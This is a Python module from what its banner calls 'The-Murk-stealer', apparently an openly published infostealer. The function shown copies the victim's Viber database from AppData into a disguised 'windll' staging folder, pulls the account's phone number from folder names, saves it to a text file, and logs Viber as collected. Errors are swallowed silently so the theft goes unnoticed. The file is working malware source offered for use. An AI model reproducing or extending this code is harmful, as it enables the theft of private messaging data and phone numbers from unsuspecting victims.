#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,environ,listdir,makedirs
from shutil import copy2
path = r'ViberPC\config.db'
path1 = r'ViberPC'

def Viber(data):
        try :   
            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
            makedirs(rf'{pathtofile}\windll\Messengers\Viber')
            user = environ['USERPROFILE'] + sep + r'AppData\Roaming'
            copy2(user+ sep + path,rf'{pathtofile}\windll\Messengers\Viber')# copy data
            dirs = listdir(f"{user+sep+path1}")# get phone number
            for filename in dirs:
                if (filename.isdigit()):
                    with open(rf"{pathtofile}\windll\Messengers\Viber\phoneNumber.txt", "a", encoding="utf-8") as num:# write phone number
                        num.write("+"+filename)
                    num.close()
            data.append("\n∟📨Viber")
            return data
        except:
            return data